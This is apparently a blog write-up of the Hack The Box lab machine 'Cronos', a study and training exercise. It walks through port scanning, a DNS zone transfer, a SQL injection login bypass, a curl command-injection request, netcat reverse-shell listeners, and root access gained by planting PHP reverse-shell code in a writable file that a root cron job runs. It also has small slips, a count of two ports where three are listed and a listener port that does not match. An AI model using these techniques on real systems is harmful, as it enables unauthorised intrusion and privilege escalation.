---

title: 🟠 HTB - Cronos
author: Acivik
date: 2025-01-24 17:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, Cronos, walkthrough, medium, linux]

---

![https://i.ibb.co/hxGG59y/Cronos.png](https://i.ibb.co/hxGG59y/Cronos.png)

---

# <span style="color:#AA0E1C"><b># Reconnaissance</b></span>

## <span style="color:#0096FF">Nmap</span>

nmap detected 2 open TCP ports: 22(SSH), 53/tcp-udp(DOMAIN), 80 (HTTP)

```bash
root@kali:~/HTB/cronos# nmap -p22,53,80 10.10.10.13 -sVC --min-rate 1000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 18:17 UTC
Nmap scan report for 10.10.10.13 (10.10.10.13)
Host is up (0.084s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.79 seconds
root@kali:~/HTB/cronos#
```

Looking at the OpenSSH and Apache versions, the target machine is likely running Ubuntu 16.04 LTS (Xenial Xerus).

# # Enumeration

## <span style="color:#0096FF">DNS</span>

```bash
root@kali:~/HTB/cronos# nslookup
> server
Default server: 192.168.23.2
Address: 192.168.23.2#53
> server 127.0.0.1
Default server: 127.0.0.1
Address: 127.0.0.1#53
> server
Default server: 127.0.0.1
Address: 127.0.0.1#53
> 127.0.0.1
;; communications error to 127.0.0.1#53: connection refused
;; communications error to 127.0.0.1#53: connection refused
;; communications error to 127.0.0.1#53: connection refused
;; no servers could be reached

> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
>

```

```bash
root@kali:~/HTB/cronos# dig AXFR @10.10.10.13 cronos.htb

; <<>> DiG 9.19.21-1+b1-Debian <<>> AXFR @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 63 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Fri Jan 24 10:15:51 UTC 2025
;; XFR size: 7 records (messages 1, bytes 203)

root@kali:~/HTB/cronos#
```

save it to `/etc/hosts` 

`10.10.10.13 cronos.htb admin.cronos.htb ns1.cronos.htb www.cronos.htb`

## <span style="color:#0096FF">cronos.htb</span>

![https://i.ibb.co/HXG5qWx/Ekran-g-r-nt-s-2025-01-14-212232.png](https://i.ibb.co/HXG5qWx/Ekran-g-r-nt-s-2025-01-14-212232.png)

default apache page

## <span style="color:#0096FF">admin.cronos.htb</span>

![https://i.ibb.co/3W86th6/Ekran-g-r-nt-s-2025-01-14-220258.png](https://i.ibb.co/3W86th6/Ekran-g-r-nt-s-2025-01-14-220258.png)

I logged in using SQL injection authentication bypass.

![https://i.ibb.co/9pnybMm/Ekran-g-r-nt-s-2025-01-14-220315.png](https://i.ibb.co/9pnybMm/Ekran-g-r-nt-s-2025-01-14-220315.png)

There’s a tool in admin dashboard.

When I saw this page, I thought of a command injection vulnerability.

# <span style="color:#AA0E1C"><b># Foothold: Shell as www-data</b></span>

```bash
root@kali:~/HTB/cronos# curl -X POST -b 'PHPSESSID=qj9ubgsfkfjhfq0vnk7ifn0ph1' --data-binary 'command=id&host=' 'http://admin.cronos.htb/welcome.php' -s | grep "<br>"
			uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>
root@kali:~/HTB/cronos#
```

we can get a reverse shell

```bash
root@kali:~/HTB/cronos# nc -lnvp 4141
listening on [any] 4141 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.10.13] 38586
bash: cannot set terminal process group (1313): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$
```

# <span style="color:#AA0E1C"><b># Privilege Escalation: www-data → root</b></span>

```bash
www-data@cronos:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
#
www-data@cronos:/tmp$
```

root is runs php file

we have write permission for that file

```bash
www-data@cronos:/var/www/laravel$ ls -l artisan 
-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 artisan
www-data@cronos:/var/www/laravel$
```

I inserted PHP reverse shell code into it.

```bash
root@kali:~/tools# nc -lnvp 1214
listening on [any] 1213 ...
connect to [10.10.14.41] from (UNKNOWN) [10.10.10.13] 38276
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 21:43:01 up  1:27,  0 users,  load average: 0.00, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
#
```